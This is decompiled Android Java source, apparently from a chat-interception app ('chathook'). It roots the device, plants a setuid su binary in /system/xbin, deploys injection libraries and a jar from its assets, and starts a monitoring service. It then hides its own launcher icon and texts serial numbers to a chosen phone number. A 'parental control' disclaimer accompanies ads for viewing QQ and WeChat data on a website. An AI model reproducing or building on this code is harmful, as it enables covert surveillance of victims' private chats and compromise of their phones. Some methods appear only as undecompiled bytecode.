package com.example.chathook;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import com.example.windseeker.R;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;

public class MainActivity extends Activity {
    public String SU_cmd = "competing_su";
    /* access modifiers changed from: private */
    public EditText edittextphone;
    /* access modifiers changed from: private */
    public String info;
    public DataOutputStream mOutputStream;
    public Button sendsmsButton;
    private TextView textview1;
    private TextView textviewinfo;
    private TextView textviewmsg;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_service_start);
        this.textview1 = (TextView) findViewById(R.id.textView1);
        this.textviewinfo = (TextView) findViewById(R.id.textViewinfo);
        this.textviewmsg = (TextView) findViewById(R.id.textViewmsg);
        this.edittextphone = (EditText) findViewById(R.id.editTextphone);
        this.sendsmsButton = (Button) findViewById(R.id.button1);
        this.sendsmsButton.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                String phone = MainActivity.this.edittextphone.getText().toString();
                Log.i("ligan", "phone=" + phone);
                if (phone.length() < 1) {
                    Toast.makeText(MainActivity.this, "电话号码错误", 1).show();
                    return;
                }
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendMultipartTextMessage(phone, null, smsManager.divideMessage(MainActivity.this.info), null, null);
                Toast.makeText(MainActivity.this, "短信已发送。", 1).show();
            }
        });
        this.info = "查看QQ序列号 :\n" + InjectApplicaiton.QQSN + "\n" + "查看微信序列号:\n" + InjectApplicaiton.MMSN + "\n" + "免费密码:序列号后4位\n" + "查看网址:www.qq-wx.net\n\n" + "客服电话:18967897800 \n" + "客服QQ:411327911\n" + "客服微信：shudianhong01" + "此软件为引导孩子正确上网、适度娱乐，防范不健康信息给他们的身心健康带来不良隐患；严禁将此软件用于非法用途，若因此产生的责任，由使用者独自承担一切后果，特此声明";
        setText(this.textviewinfo, this.info);
        findViewById(R.id.buttonphone).setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                Toast.makeText(MainActivity.this, "正在开始服务，。。。。。。。。。。", 1).show();
                if (InjectApplicaiton.QQSN.equals("IMEI ERROR")) {
                    Toast.makeText(MainActivity.this, "手机 没有IMEI 号，无法生成序列号，请联系客服", 1).show();
                    return;
                }
                try {
                    File sufile = new File("/system/bin/su");
                    File su1file = new File("/system/xbin/su");
                    if (sufile.exists() || su1file.exists()) {
                        MainActivity.this.SU_cmd = "su";
                    }
                    Process mProcess = Runtime.getRuntime().exec(MainActivity.this.SU_cmd);
                    MainActivity.this.mOutputStream = new DataOutputStream(mProcess.getOutputStream());
                    InjectUtils.exeCMD("mount > " + MainActivity.this.getFilesDir() + "/mount \n");
                    File mountFile = new File(new StringBuilder(String.valueOf(MainActivity.this.getFilesDir().getAbsolutePath())).append("/mount").toString());
                    while (!mountFile.exists()) {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                        }
                        Log.i("yincc", " Applicaiton Mount File exists? " + mountFile.exists());
                    }
                    InjectUtils.exeCMD("chmod 777 " + MainActivity.this.getFilesDir() + "/mount \n");
                    if (MainActivity.this.SU_cmd.equals("su")) {
                        MainActivity.this.copyAssetsFiles("competing_su");
                        MainActivity.this.copySU(MainActivity.this.getApplication());
                    }
                    MainActivity.this.copyAssetsFiles("inject_appso");
                    MainActivity.this.copyAssetsFiles("libcall.so");
                    MainActivity.this.copyAssetsFiles("conn.jar");
                    InjectUtils.copyInjectfile(MainActivity.this.getApplication());
                    Log.i("yincc", " INjectApplication !!! startServcie");
                    MainActivity.this.startService(new Intent(MainActivity.this.getApplication(), ProcessMonitor.class));
                    MainActivity.this.getPackageManager().setComponentEnabledSetting(MainActivity.this.getComponentName(), 2, 1);
                    MainActivity.this.finish();
                } catch (IOException e2) {
                    Log.i("yincc", "Exception " + e2.getMessage());
                    Toast.makeText(MainActivity.this, "手机没有root，无法启动服务", 1).show();
                    e2.printStackTrace();
                }
            }
        });
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        return true;
    }

    private void setText(TextView textview, String string) {
        textview.setText(string);
    }

    private String getPassword(String SN) {
        String password = new String(new char[]{(char) (((SN.charAt(1) + 6) % 10) + 48), (char) (((SN.charAt(2) + 8) % 10) + 48), (char) (((SN.charAt(3) + 1) % 10) + 48), (char) (((SN.charAt(4) + 1) % 10) + 48), (char) (((SN.charAt(5) + 2) % 10) + 48), (char) (((SN.charAt(6) + 1) % 10) + 48)});
        Log.i("yincc", "password " + password);
        return password;
    }

    /* access modifiers changed from: private */
    public void copySU(Context context) {
        String systemDev = InjectUtils.getMountDate(this);
        String sufilepath = new StringBuilder(String.valueOf(context.getFilesDir().getAbsolutePath())).append("/competing_su").toString();
        InjectUtils.exeCMD(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("" + "mount -o remount,rw " + systemDev + " /system \n")).append("mount -o remount,rw /system \n").toString())).append("cat ").append(sufilepath).append(" > /system/xbin/competing_su \n").toString());
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
        }
        File originalsuFile = new File(sufilepath);
        File sufile = new File("/system/xbin/competing_su");
        Log.i("ligan", "file length =" + sufile.length() + "sufile = " + originalsuFile.length());
        while (sufile.length() != originalsuFile.length()) {
            InjectUtils.exeCMD("cat " + sufilepath + " > /system/xbin/competing_su \n");
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e2) {
            }
            Log.i("ligan", "cat su file ");
            Log.i("ligan", "file length =" + sufile.length() + "sufile = " + originalsuFile.length());
        }
        InjectUtils.exeCMD("chown root.root /system/xbin/competing_su \n" + "chmod 6777 /system/xbin/competing_su \n");
    }

    /* access modifiers changed from: private */
    public void copyAssetsFiles(final String fileName) {
        new Thread(new Runnable() {
            /* JADX WARNING: Removed duplicated region for block: B:35:? A:{SYNTHETIC, RETURN} */
            /* JADX WARNING: Removed duplicated region for block: B:16:0x0064 A:{SYNTHETIC, Splitter:B:16:0x0064} */
            /* JADX WARNING: Removed duplicated region for block: B:22:0x0070 A:{SYNTHETIC, Splitter:B:22:0x0070} */
            public void run() {
                /*
                r9 = this;
                r3 = 0;
                r7 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x005e }
                r7.<init>();	 Catch:{ Exception -> 0x005e }
                r8 = com.example.chathook.MainActivity.this;	 Catch:{ Exception -> 0x005e }
                r8 = r8.getApplication();	 Catch:{ Exception -> 0x005e }
                r8 = r8.getFilesDir();	 Catch:{ Exception -> 0x005e }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x005e }
                r8 = "/";
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x005e }
                r8 = r3;	 Catch:{ Exception -> 0x005e }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x005e }
                r2 = r7.toString();	 Catch:{ Exception -> 0x005e }
                r5 = new java.io.File;	 Catch:{ Exception -> 0x005e }
                r5.<init>(r2);	 Catch:{ Exception -> 0x005e }
                r7 = r5.exists();	 Catch:{ Exception -> 0x005e }
                if (r7 != 0) goto L_0x0032;
            L_0x002f:
                r5.createNewFile();	 Catch:{ Exception -> 0x005e }
            L_0x0032:
                r7 = com.example.chathook.MainActivity.this;	 Catch:{ Exception -> 0x005e }
                r7 = r7.getApplication();	 Catch:{ Exception -> 0x005e }
                r7 = r7.getResources();	 Catch:{ Exception -> 0x005e }
                r7 = r7.getAssets();	 Catch:{ Exception -> 0x005e }
                r8 = r3;	 Catch:{ Exception -> 0x005e }
                r6 = r7.open(r8);	 Catch:{ Exception -> 0x005e }
                r7 = r6.available();	 Catch:{ Exception -> 0x005e }
                r0 = new byte[r7];	 Catch:{ Exception -> 0x005e }
                r6.read(r0);	 Catch:{ Exception -> 0x005e }
                r4 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x005e }
                r4.<init>(r5);	 Catch:{ Exception -> 0x005e }
                r4.write(r0);	 Catch:{ Exception -> 0x0082, all -> 0x007f }
                if (r4 == 0) goto L_0x007d;
            L_0x0059:
                r4.close();	 Catch:{ IOException -> 0x0079 }
                r3 = r4;
            L_0x005d:
                return;
            L_0x005e:
                r1 = move-exception;
            L_0x005f:
                r1.printStackTrace();	 Catch:{ all -> 0x006d }
                if (r3 == 0) goto L_0x005d;
            L_0x0064:
                r3.close();	 Catch:{ IOException -> 0x0068 }
                goto L_0x005d;
            L_0x0068:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x005d;
            L_0x006d:
                r7 = move-exception;
            L_0x006e:
                if (r3 == 0) goto L_0x0073;
            L_0x0070:
                r3.close();	 Catch:{ IOException -> 0x0074 }
            L_0x0073:
                throw r7;
            L_0x0074:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x0073;
            L_0x0079:
                r1 = move-exception;
                r1.printStackTrace();
            L_0x007d:
                r3 = r4;
                goto L_0x005d;
            L_0x007f:
                r7 = move-exception;
                r3 = r4;
                goto L_0x006e;
            L_0x0082:
                r1 = move-exception;
                r3 = r4;
                goto L_0x005f;
                */
                throw new UnsupportedOperationException("Method not decompiled: com.example.chathook.MainActivity$AnonymousClass3.run():void");
            }
        }).start();
    }

    private void copyAssetsFiles_jar(final String fileName) {
        new Thread(new Runnable() {
            /* JADX WARNING: Removed duplicated region for block: B:35:? A:{SYNTHETIC, RETURN} */
            /* JADX WARNING: Removed duplicated region for block: B:16:0x0052 A:{SYNTHETIC, Splitter:B:16:0x0052} */
            /* JADX WARNING: Removed duplicated region for block: B:22:0x005e A:{SYNTHETIC, Splitter:B:22:0x005e} */
            public void run() {
                /*
                r9 = this;
                r3 = 0;
                r7 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x004c }
                r8 = "/sdcard/";
                r7.<init>(r8);	 Catch:{ Exception -> 0x004c }
                r8 = r3;	 Catch:{ Exception -> 0x004c }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x004c }
                r2 = r7.toString();	 Catch:{ Exception -> 0x004c }
                r5 = new java.io.File;	 Catch:{ Exception -> 0x004c }
                r5.<init>(r2);	 Catch:{ Exception -> 0x004c }
                r7 = r5.exists();	 Catch:{ Exception -> 0x004c }
                if (r7 != 0) goto L_0x0020;
            L_0x001d:
                r5.createNewFile();	 Catch:{ Exception -> 0x004c }
            L_0x0020:
                r7 = com.example.chathook.MainActivity.this;	 Catch:{ Exception -> 0x004c }
                r7 = r7.getApplication();	 Catch:{ Exception -> 0x004c }
                r7 = r7.getResources();	 Catch:{ Exception -> 0x004c }
                r7 = r7.getAssets();	 Catch:{ Exception -> 0x004c }
                r8 = r3;	 Catch:{ Exception -> 0x004c }
                r6 = r7.open(r8);	 Catch:{ Exception -> 0x004c }
                r7 = r6.available();	 Catch:{ Exception -> 0x004c }
                r0 = new byte[r7];	 Catch:{ Exception -> 0x004c }
                r6.read(r0);	 Catch:{ Exception -> 0x004c }
                r4 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x004c }
                r4.<init>(r5);	 Catch:{ Exception -> 0x004c }
                r4.write(r0);	 Catch:{ Exception -> 0x0070, all -> 0x006d }
                if (r4 == 0) goto L_0x006b;
            L_0x0047:
                r4.close();	 Catch:{ IOException -> 0x0067 }
                r3 = r4;
            L_0x004b:
                return;
            L_0x004c:
                r1 = move-exception;
            L_0x004d:
                r1.printStackTrace();	 Catch:{ all -> 0x005b }
                if (r3 == 0) goto L_0x004b;
            L_0x0052:
                r3.close();	 Catch:{ IOException -> 0x0056 }
                goto L_0x004b;
            L_0x0056:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x004b;
            L_0x005b:
                r7 = move-exception;
            L_0x005c:
                if (r3 == 0) goto L_0x0061;
            L_0x005e:
                r3.close();	 Catch:{ IOException -> 0x0062 }
            L_0x0061:
                throw r7;
            L_0x0062:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x0061;
            L_0x0067:
                r1 = move-exception;
                r1.printStackTrace();
            L_0x006b:
                r3 = r4;
                goto L_0x004b;
            L_0x006d:
                r7 = move-exception;
                r3 = r4;
                goto L_0x005c;
            L_0x0070:
                r1 = move-exception;
                r3 = r4;
                goto L_0x004d;
                */
                throw new UnsupportedOperationException("Method not decompiled: com.example.chathook.MainActivity$AnonymousClass4.run():void");
            }
        }).start();
    }
}
